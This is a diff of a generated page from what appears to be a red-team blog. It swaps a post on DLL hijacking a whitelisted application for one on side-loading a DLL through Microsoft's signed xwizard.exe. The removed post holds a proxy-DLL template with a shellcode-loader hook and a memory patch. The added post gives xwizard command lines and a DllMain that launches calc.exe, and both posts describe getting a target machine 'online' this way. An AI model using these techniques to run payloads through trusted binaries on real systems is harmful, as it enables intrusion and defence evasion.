@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DLL hijacking the whitelist application online, Yangsir">
+    <meta name="keywords" content="Xwizard Microsoft program use white and black, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DLL hijacking the whitelist application online | Yangsir</title>
+    <title>Xwizard Microsoft program use white and black | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145815560.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DLL hijacking the whitelist application online</h1>
+                    <h1 class="description center-align post-title">Xwizard Microsoft program use white and black</h1>
                 </div>
             </div>
         </div>
@@ -461,7 +461,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-20
+                    2021-07-23
                 </div>
                 
 
@@ -470,14 +470,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    469
+                    173
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    2 Min
+                    1 Min
                 </div>
                 
 
@@ -500,167 +500,50 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>Application EXE unsigned white program, call their own compiled black DLL, here to QQ housekeeper function as a case, the implementation of the source code is as follows</p>
-<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">extern &quot;C&quot; __declspec(dllexport) void test();
+                <h2 id="What-it-is"><a href="#What-it-is" class="headerlink" title="What it is"></a>What it is</h2><pre class="line-numbers language-none"><code class="language-none">xwizard.exe use xwizards.dll，Support win7 and above system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-DWORD WINAPI DDOS(LPVOID lpParameter)
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145222987.png" alt="image"></p>
+<h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">such as Path: C:\Windows\System32
+
+Use case:
+xwizard processXMLFile 1.txt
+xwizard RunWizard &#x2F;u &#123;11111111-1111-1111-1111-111111111111&#125;
+xwizard RunPropertySheet &#x2F;u &#123;11111111-1111-1111-1111-111111111111&#125;
+Note that the GUID length needs to be fixed, otherwise an error will be reported<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210722160656515.png" alt="image"></p>
+<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">The popover code is as follows:
+#include &quot;pch.h&quot;
+#include
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD ul_reason_for_call,
+LPVOID lpReserved)
 &#123;
-	your shellcode loader
+switch (ul_reason_for_call)
+&#123;
+case DLL_PROCESS_ATTACH:
+MessageBox(NULL, &quot;yyy&quot;, &quot;y&quot;, MB_OK);
+WinExec(&quot;calc.exe&quot;, SW_HIDE);
+case DLL_THREAD_ATTACH:
+case DLL_THREAD_DETACH:
+case DLL_PROCESS_DETACH:
+break;
+&#125;
+return TRUE;
 &#125;
 
-static
-HMODULE g_OldModule &#x3D; NULL;
+Running the program directly will not trigger the popover<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-VOID WINAPI Free()
-&#123;
-	if (g_OldModule)
-	&#123;
-		FreeLibrary(g_OldModule);
-	&#125;
-&#125;
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145554786.png" alt="image"></p>
+<pre class="line-numbers language-none"><code class="language-none">Confirm that the popover can be triggered after the normal call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145658925.png" alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145709773.png" alt="image"></p>
+<pre class="line-numbers language-none"><code class="language-none">Must conform to the relevant grammatical structure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-BOOL WINAPI Load()
-&#123;
-	TCHAR tzPath[MAX_PATH];
-	TCHAR tzTemp[MAX_PATH * 2];
-
-
-	&#x2F;&#x2F;GetModuleFileName(NULL,tzPath,MAX_PATH); 
-	&#x2F;&#x2F;PathRemoveFileSpec(tzPath);
-
-	GetSystemDirectory(tzPath, MAX_PATH); 
-
-	lstrcat(tzPath, TEXT(&quot;\\dllname.dll&quot;));
-
-	g_OldModule &#x3D; LoadLibrary(tzPath);
-	if (g_OldModule &#x3D;&#x3D; NULL)
-	&#123;
-		wsprintf(tzTemp, TEXT(&quot;无法找到模块 %s,程序无法正常运行&quot;), tzPath);
-		MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);
-	&#125;
-
-	return (g_OldModule !&#x3D; NULL);
-
-&#125;
-
-
-FARPROC WINAPI GetAddress(PCSTR pszProcName)
-&#123;
-	FARPROC fpAddress;
-	CHAR szProcName[64];
-	TCHAR tzTemp[MAX_PATH];
-
-	fpAddress &#x3D; GetProcAddress(g_OldModule, pszProcName);
-	if (fpAddress &#x3D;&#x3D; NULL)
-	&#123;
-		if (HIWORD(pszProcName) &#x3D;&#x3D; 0)
-		&#123;
-			wsprintfA(szProcName, &quot;#%d&quot;, pszProcName);
-			pszProcName &#x3D; szProcName;
-		&#125;
-
-		wsprintf(tzTemp, TEXT(&quot;无法找到函数 %hs,程序无法正常运行&quot;), pszProcName);
-		MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);
-		ExitProcess(-2);
-	&#125;
-	return fpAddress;
-&#125;
-
-BOOL WINAPI Init()
-&#123;
-	pfnAheadLib_GetVgaAllInfo &#x3D; GetAddress(&quot;GetVgaAllInfo&quot;);
-	pfnAheadLib_GetVgaTemp &#x3D; GetAddress(&quot;GetVgaTemp&quot;);
-	return TRUE;
-&#125;
-
-DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)
-&#123;
-	HANDLE hProcess;
-
-	PVOID addr1 &#x3D; reinterpret_cast&lt;PVOID&gt;(0x00401000);
-	BYTE data1[] &#x3D; &#123; 0x90, 0x90, 0x90, 0x90 &#125;;
-
-	
-	hProcess &#x3D; OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
-	if (hProcess)
-	&#123;
-		WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);
-
-		CloseHandle(hProcess);
-	&#125;
-
-	return 0;
-&#125;
-
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
-&#123;
-	HANDLE threadHandle;
-	threadHandle &#x3D; CreateThread(NULL, 0, DDOS, NULL, 0, NULL);
-	if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)
-	&#123;
-
-		DisableThreadLibraryCalls(hModule);
-
-		if (Load() &amp;&amp; Init())
-		&#123;
-			TCHAR szAppName[MAX_PATH] &#x3D; TEXT(&quot;MyApp.exe&quot;);
-			TCHAR szCurName[MAX_PATH];
-
-			GetModuleFileName(NULL, szCurName, MAX_PATH);
-			PathStripPath(szCurName);
-
-			
-			if (StrCmpI(szCurName, szAppName) &#x3D;&#x3D; 0)
-			&#123;
-				
-				HANDLE hThread &#x3D; CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);
-				if (hThread)
-				&#123;
-					CloseHandle(hThread);
-				&#125;
-			&#125;
-		&#125;
-	&#125;
-	else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)
-	&#123;
-		Free();
-	&#125;
-
-	return TRUE;
-&#125;
-
-EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaAllInfo(void)
-&#123;
-	__asm jmp pfnAheadLib_GetVgaAllInfo;
-&#125;
-
-EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaTemp(void)
-&#123;
-	__asm jmp pfnAheadLib_GetVgaTemp;
-&#125;
-
-void test()
-&#123;
-	MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, MB_OK);
-	HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;dllname.dll&quot;);
-	if (hDllInst)
-	&#123;
-		typedef DWORD(WINAPI *EXPFUNC)();
-		EXPFUNC exportFunc &#x3D; NULL;
-		exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);
-		if (exportFunc)
-		&#123;
-			exportFunc();
-		&#125;
-		FreeLibrary(hDllInst);
-	&#125;
-	return;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="Final-result"><a href="#Final-result" class="headerlink" title="Final result"></a>Final result</h2><p>Use the signed white program to call the black DLL successfully online the target machine</p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145815560.png" alt="image"></p>
+<pre class="line-numbers language-none"><code class="language-none">Note that you need to distinguish between 64 and 32 bits!!
+In the same way, you can run the program here and you can go online，The basic operations are omitted<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -687,7 +570,7 @@ void test()
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/20/dll-hijacking-the-whitelist-application-online/">https://yangsirrr.github.io/2021/07/20/dll-hijacking-the-whitelist-application-online/</a>
+                    <a href="https://yangsirrr.github.io/2021/07/23/xwizard-microsoft-program-use-white-and-black/">https://yangsirrr.github.io/2021/07/23/xwizard-microsoft-program-use-white-and-black/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -776,9 +659,63 @@ void test()
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2021/07/23/xwizard-microsoft-program-use-white-and-black/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145815560.png" class="responsive-img" alt="Xwizard Microsoft program use white and black">
+                        
+                        <span class="card-title">Xwizard Microsoft program use white and black</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-23
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Learning-record/" class="post-category">
+                                    Learning record
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Redteam/">
+                        <span class="chip bg-color">Redteam</span>
+                    </a>
+                    
+                    <a href="/tags/Bypass/">
+                        <span class="chip bg-color">Bypass</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2021/07/21/sensitive-path-information-concerns/">
                     <div class="card-image">
@@ -796,9 +733,9 @@ void test()
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -820,58 +757,6 @@ void test()
                     
                     <a href="/tags/Information-collection/">
                         <span class="chip bg-color">Information collection</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/07/19/dll-hijacking-from-hijacking-to-on-line/">
-                    <div class="card-image">
-                        
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png" class="responsive-img" alt="DLL hijacking from hijacking to on-line">
-                        
-                        <span class="card-title">DLL hijacking from hijacking to on-line</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-19
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Learning-record/" class="post-category">
-                                    Learning record
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Redteam/">
-                        <span class="chip bg-color">Redteam</span>
-                    </a>
-                    
-                    <a href="/tags/Bypass/">
-                        <span class="chip bg-color">Bypass</span>
                     </a>
                     
                 </div>
